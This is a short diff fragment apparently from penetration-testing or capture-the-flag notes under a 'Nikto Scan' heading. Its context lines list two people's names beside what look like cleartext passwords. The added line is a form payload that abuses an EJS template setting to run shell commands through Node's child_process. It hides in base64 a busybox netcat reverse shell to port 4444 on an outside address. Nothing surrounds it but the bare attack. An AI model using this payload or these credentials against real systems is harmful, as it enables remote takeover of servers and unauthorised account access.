@@ -39,3 +39,5 @@ Nikto Scan:
 
 Gayle Bev: p~]P@5!6;rs558:q
 Olivia Cortez: olivi8
+
+name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjEzNC41NiA0NDQ0IC1lIC9iaW4vYmFzaA== | base64 -d | bash"');//
